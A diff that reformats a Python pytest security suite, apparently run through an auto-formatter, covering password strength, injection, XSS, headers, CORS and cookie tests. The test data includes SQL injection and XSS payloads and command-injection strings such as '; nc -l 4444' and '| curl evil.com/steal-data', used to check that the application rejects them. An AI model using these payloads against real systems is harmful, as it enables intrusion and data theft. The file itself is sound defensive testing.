@@ -17,6 +17,7 @@ import pytest
 @dataclass
 class SecurityTestResult:
     """Result of a security test."""
+
     test_name: str
     vulnerability_found: bool
     severity: str
@@ -40,14 +41,14 @@ class TestAuthenticationSecurity:
             "welcome",
             "monkey",
             "1234567890",
-            "password1"
+            "password1",
         ]
 
         strong_passwords = [
             "Tr0ub4dor&3",
             "correct horse battery staple",
             "MyP@ssw0rd!2023",
-            "Sup3r$3cur3P@$$w0rd"
+            "Sup3r$3cur3P@$$w0rd",
         ]
 
         # Test weak passwords are rejected
@@ -126,7 +127,7 @@ class TestInputValidationSecurity:
             "' OR '1'='1",
             "'; UPDATE users SET admin=1; --",
             "' UNION SELECT password FROM users WHERE '1'='1",
-            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
+            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
         ]
 
         for payload in injection_payloads:
@@ -146,7 +147,7 @@ class TestInputValidationSecurity:
             "<img src=x onerror=alert('XSS')>",
             "<svg onload=alert('XSS')>",
             "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
-            "\";alert('XSS');//"
+            "\";alert('XSS');//",
         ]
 
         for payload in xss_payloads:
@@ -171,7 +172,7 @@ class TestInputValidationSecurity:
             "`whoami`",
             "$(cat /etc/hosts)",
             "; nc -l 4444",
-            "| curl evil.com/steal-data"
+            "| curl evil.com/steal-data",
         ]
 
         for payload in injection_payloads:
@@ -208,7 +209,9 @@ class TestCryptographicSecurity:
 
         # Test hash strength (should use strong algorithm like bcrypt, scrypt, or argon2)
         assert len(hash1) >= 60, "Hash should be at least 60 characters (bcrypt)"
-        assert hash1.startswith(("$2b$", "$scrypt$", "$argon2")), "Should use strong hashing algorithm"
+        assert hash1.startswith(("$2b$", "$scrypt$", "$argon2")), (
+            "Should use strong hashing algorithm"
+        )
 
     async def test_encryption_security(self, crypto_service):
         """Test encryption/decryption security."""
@@ -327,16 +330,17 @@ class TestSecurityScanning:
         scan_results = await vulnerability_scanner.scan_dependencies()
 
         high_severity_vulns = [
-            vuln for vuln in scan_results
-            if vuln.severity in ["HIGH", "CRITICAL"]
+            vuln for vuln in scan_results if vuln.severity in ["HIGH", "CRITICAL"]
         ]
 
         # Fail if high severity vulnerabilities are found
         if high_severity_vulns:
-            vuln_details = "\n".join([
-                f"- {vuln.package}: {vuln.vulnerability_id} ({vuln.severity})"
-                for vuln in high_severity_vulns
-            ])
+            vuln_details = "\n".join(
+                [
+                    f"- {vuln.package}: {vuln.vulnerability_id} ({vuln.severity})"
+                    for vuln in high_severity_vulns
+                ]
+            )
             pytest.fail(f"High severity vulnerabilities found:\n{vuln_details}")
 
     async def test_secrets_detection(self, secrets_scanner):
@@ -344,15 +348,18 @@ class TestSecurityScanning:
         scan_results = await secrets_scanner.scan_codebase()
 
         found_secrets = [
-            result for result in scan_results
+            result
+            for result in scan_results
             if result.confidence > 0.8  # High confidence detections only
         ]
 
         if found_secrets:
-            secret_details = "\n".join([
-                f"- {secret.file_path}:{secret.line_number}: {secret.secret_type}"
-                for secret in found_secrets
-            ])
+            secret_details = "\n".join(
+                [
+                    f"- {secret.file_path}:{secret.line_number}: {secret.secret_type}"
+                    for secret in found_secrets
+                ]
+            )
             pytest.fail(f"Potential secrets found in codebase:\n{secret_details}")
 
     async def test_code_security_analysis(self, static_analyzer):
@@ -360,15 +367,16 @@ class TestSecurityScanning:
         analysis_results = await static_analyzer.analyze_security()
 
         security_issues = [
-            issue for issue in analysis_results
-            if issue.severity in ["HIGH", "CRITICAL"]
+            issue for issue in analysis_results if issue.severity in ["HIGH", "CRITICAL"]
         ]
 
         if security_issues:
-            issue_details = "\n".join([
-                f"- {issue.file_path}:{issue.line_number}: {issue.description}"
-                for issue in security_issues
-            ])
+            issue_details = "\n".join(
+                [
+                    f"- {issue.file_path}:{issue.line_number}: {issue.description}"
+                    for issue in security_issues
+                ]
+            )
             pytest.fail(f"Security issues found in code:\n{issue_details}")
 
 
@@ -387,7 +395,7 @@ class TestSecurityHeaders:
             "X-XSS-Protection": "1; mode=block",
             "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
             "Content-Security-Policy": lambda value: "default-src 'self'" in value,
-            "Referrer-Policy": "strict-origin-when-cross-origin"
+            "Referrer-Policy": "strict-origin-when-cross-origin",
         }
 
         for header, expected_value in required_headers.items():
@@ -406,8 +414,8 @@ class TestSecurityHeaders:
             headers={
                 "Origin": "https://evil.com",
                 "Access-Control-Request-Method": "POST",
-                "Access-Control-Request-Headers": "Content-Type"
-            }
+                "Access-Control-Request-Headers": "Content-Type",
+            },
         )
 
         # Should not allow arbitrary origins
@@ -419,10 +427,9 @@ class TestSecurityHeaders:
     async def test_cookie_security(self, web_client):
         """Test cookie security configuration."""
         # Login to get session cookie
-        response = await web_client.post("/api/auth/login", json={
-            "username": "test_user",
-            "password": "test_password"
-        })
+        response = await web_client.post(
+            "/api/auth/login", json={"username": "test_user", "password": "test_password"}
+        )
 
         # Check session cookie security
         set_cookie = response.headers.get("Set-Cookie", "")
